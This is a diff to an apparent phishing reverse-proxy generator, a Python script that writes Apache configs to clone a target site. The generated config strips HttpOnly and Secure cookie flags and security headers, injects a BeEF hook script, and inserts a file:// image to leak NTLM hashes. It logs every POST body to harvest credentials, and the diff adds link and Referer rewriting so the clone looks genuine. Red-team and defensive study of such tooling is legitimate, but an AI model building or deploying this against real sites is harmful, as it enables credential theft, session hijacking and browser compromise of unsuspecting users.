@@ -174,6 +174,10 @@ if __name__ == "__main__":
                                                               '(example: "http://test.com")',  default=None)
     parser.add_argument('-N', '--server_name', type=str, help='Set Server name for proxy (example: "test.com")',
                         default=None)
+    parser.add_argument('-R', '--replace_links', action='store_true', help='Replace links in origin response')
+    parser.add_argument('--redirect_ssl', action='store_true', help='Permanent redirect to https site')
+    parser.add_argument('--no_del_headers', action='store_true',
+                        help='Do not delete security headers in origin response')
     parser.add_argument('-C', '--country', type=str, help='Set Country for SSL cert (default: RU)',
                         default='RU')
     parser.add_argument('-S', '--state', type=str, help='Set State for SSL cert (default: Moscow)',
@@ -276,49 +280,61 @@ if __name__ == "__main__":
     with open(args.http_config, "a") as http_config_file:
         http_config_file.write("\n\n<VirtualHost *:80>" +
                                "\n\tServerName " + server_name +
-                               "\n\tServerAdmin admin@" + domain +
-                               "\n\tProxyPass \"/\" \"" + args.url + "/\"" +
-                               "\n\tProxyPassReverse \"/\" \"" + args.url + "/\"" +
-                               "\n\tHeader edit Set-Cookie \"^(.*);[ |][H|h]ttp[O|o]nly(.*)$\" \"$1$2\"" +
-                               "\n\tHeader unset X-Frame-Options" +
-                               "\n\tHeader unset X-XSS-Protection" +
-                               "\n\tHeader unset X-Content-Type-Options" +
-                               "\n\tHeader unset Referer-Policy" +
-                               "\n\tHeader unset Content-Security-Policy" +
-                               "\n\tHeader unset X-Content-Security-Policy" +
-                               "\n\tHeader unset Content-Security-Policy-Report-Only")
+                               "\n\tServerAdmin admin@" + domain)
+        if args.redirect_ssl:
+            http_config_file.write("\n\tRedirect permanent / https://" + server_name + "/" +
+                                   "\n</VirtualHost>\n")
 
-        if args.replace is not None or args.beef is not None or args.leak_ntlm is not None:
-            http_config_file.write("\n\tRequestHeader unset Accept-Encoding" +
-                                   "\n\tRequestHeader set Accept-Encoding identity" +
-                                   "\n\tAddOutputFilterByType SUBSTITUTE text/html")
+        else:
+            http_config_file.write("\n\tProxyPass \"/\" \"" + args.url + "/\"" +
+                                   "\n\tProxyPassReverse \"/\" \"" + args.url + "/\"")
 
-        if args.replace is not None:
-            http_config_file.write("\n\tSubstitute \"" + args.replace + "\"")
+            if not args.no_del_headers:
+                http_config_file.write("\n\tHeader edit Set-Cookie \"^(.*);[ |][H|h]ttp[O|o]nly(.*)$\" \"$1$2\"" +
+                                       "\n\tHeader unset X-Frame-Options" +
+                                       "\n\tHeader unset X-XSS-Protection" +
+                                       "\n\tHeader unset X-Content-Type-Options" +
+                                       "\n\tHeader unset Referer-Policy" +
+                                       "\n\tHeader unset Content-Security-Policy" +
+                                       "\n\tHeader unset X-Content-Security-Policy" +
+                                       "\n\tHeader unset Content-Security-Policy-Report-Only")
 
-        if args.beef is not None:
-            http_config_file.write("\n\tSubstitute \"s|</head>|<script src='" +
-                                   args.beef + "'></script></head>|ni\"")
+            if args.replace is not None or args.beef is not None or args.leak_ntlm is not None or server_name != domain:
+                http_config_file.write("\n\tRequestHeader unset Accept-Encoding" +
+                                       "\n\tRequestHeader set Accept-Encoding identity" +
+                                       "\n\tAddOutputFilterByType SUBSTITUTE text/html")
+            if server_name != domain:
+                http_config_file.write("\n\tRequestHeader edit Referer \"^(.*)" + server_name + "(.*)$\" " +
+                                       "\"$1" + domain + "$2\"")
+                if args.replace_links:
+                    http_config_file.write("\n\tSubstitute \"s|" + domain + "|" + server_name + "|ni\"")
 
-        if args.leak_ntlm is not None:
-            http_config_file.write("\n\tSubstitute \"s|</body>|<img src='file://" +
-                                   args.leak_ntlm + "/img.png' width='0' height='0' /></body>|ni\"")
+            if args.replace is not None:
+                http_config_file.write("\n\tSubstitute \"" + args.replace + "\"")
 
-        http_config_file.write("\n\tSecRuleEngine On" +
-                               "\n\tSecAuditEngine on" +
-                               "\n\tSecAuditLog ${APACHE_LOG_DIR}/http-" + domain + "-audit.log" +
-                               "\n\tErrorLog ${APACHE_LOG_DIR}/http-" + domain + "-error.log" +
-                               "\n\tCustomLog ${APACHE_LOG_DIR}/http-" + domain + "-access.log combined" +
-                               "\n\tSecRequestBodyAccess on" +
-                               "\n\tSecAuditLogParts ABIFHZ" +
-                               "\n\tSecDefaultAction \"nolog,noauditlog,allow,phase:2\"" +
-                               "\n\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
-                               "\n\tSecRule REQUEST_URI \".*\" \"auditlog\"")
+            if args.beef is not None:
+                http_config_file.write("\n\tSubstitute \"s|</head>|<script src='" +
+                                       args.beef + "'></script></head>|ni\"")
 
-        if schema == "https":
-            http_config_file.write("\n\tSSLProxyEngine On")
+            if args.leak_ntlm is not None:
+                http_config_file.write("\n\tSubstitute \"s|</body>|<img src='file://" +
+                                       args.leak_ntlm + "/img.png' width='0' height='0' /></body>|ni\"")
 
-        http_config_file.write("\n</VirtualHost>\n")
+            http_config_file.write("\n\tSecRuleEngine On" +
+                                   "\n\tSecAuditEngine on" +
+                                   "\n\tSecAuditLog ${APACHE_LOG_DIR}/http-" + domain + "-audit.log" +
+                                   "\n\tErrorLog ${APACHE_LOG_DIR}/http-" + domain + "-error.log" +
+                                   "\n\tCustomLog ${APACHE_LOG_DIR}/http-" + domain + "-access.log combined" +
+                                   "\n\tSecRequestBodyAccess on" +
+                                   "\n\tSecAuditLogParts ABIFHZ" +
+                                   "\n\tSecDefaultAction \"nolog,noauditlog,allow,phase:2\"" +
+                                   "\n\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
+                                   "\n\tSecRule REQUEST_URI \".*\" \"auditlog\"")
+
+            if schema == "https":
+                http_config_file.write("\n\tSSLProxyEngine On")
+
+            http_config_file.write("\n</VirtualHost>\n")
 
     if schema == "https":
         print Base.c_info + "Create SSL cert and key ..."
@@ -343,22 +359,30 @@ if __name__ == "__main__":
                                     "\n\t\tServerName " + server_name +
                                     "\n\t\tServerAdmin admin@" + domain +
                                     "\n\t\tProxyPass \"/\" \"" + args.url + "/\"" +
-                                    "\n\t\tProxyPassReverse \"/\" \"" + args.url + "/\"" +
-                                    "\n\t\tHeader edit Set-Cookie \"^(.*);[ |][H|h]ttp[O|o]nly(.*)$\" \"$1$2\"" +
-                                    "\n\t\tHeader edit Set-Cookie \"^(.*);[ |][S|s]ecure(.*)$\" \"$1$2\"" +
-                                    "\n\t\tHeader unset Strict-Transport-Security" +
-                                    "\n\t\tHeader unset X-Frame-Options" +
-                                    "\n\t\tHeader unset X-XSS-Protection" +
-                                    "\n\t\tHeader unset X-Content-Type-Options" +
-                                    "\n\t\tHeader unset Referer-Policy" +
-                                    "\n\t\tHeader unset Content-Security-Policy" +
-                                    "\n\t\tHeader unset X-Content-Security-Policy" +
-                                    "\n\t\tHeader unset Content-Security-Policy-Report-Only")
+                                    "\n\t\tProxyPassReverse \"/\" \"" + args.url + "/\"")
 
-            if args.replace is not None or args.beef is not None or args.leak_ntlm is not None:
+            if not args.no_del_headers:
+                https_config_file.write("\n\t\tHeader edit Set-Cookie \"^(.*);[ |][H|h]ttp[O|o]nly(.*)$\" \"$1$2\"" +
+                                        "\n\t\tHeader edit Set-Cookie \"^(.*);[ |][S|s]ecure(.*)$\" \"$1$2\"" +
+                                        "\n\t\tHeader unset Strict-Transport-Security" +
+                                        "\n\t\tHeader unset X-Frame-Options" +
+                                        "\n\t\tHeader unset X-XSS-Protection" +
+                                        "\n\t\tHeader unset X-Content-Type-Options" +
+                                        "\n\t\tHeader unset Referer-Policy" +
+                                        "\n\t\tHeader unset Content-Security-Policy" +
+                                        "\n\t\tHeader unset X-Content-Security-Policy" +
+                                        "\n\t\tHeader unset Content-Security-Policy-Report-Only")
+
+            if args.replace is not None or args.beef is not None or args.leak_ntlm is not None or server_name != domain:
                 https_config_file.write("\n\t\tRequestHeader unset Accept-Encoding" +
                                         "\n\t\tRequestHeader set Accept-Encoding identity" +
                                         "\n\t\tAddOutputFilterByType SUBSTITUTE text/html")
+
+            if server_name != domain:
+                https_config_file.write("\n\t\tRequestHeader edit Referer \"^(.*)" + server_name + "(.*)$\" " +
+                                        "\"$1" + domain + "$2\"")
+                if args.replace_links:
+                    https_config_file.write("\n\t\tSubstitute \"s|" + domain + "|" + server_name + "|ni\"")
 
             if args.replace is not None:
                 https_config_file.write("\n\t\tSubstitute \"" + args.replace + "\"")
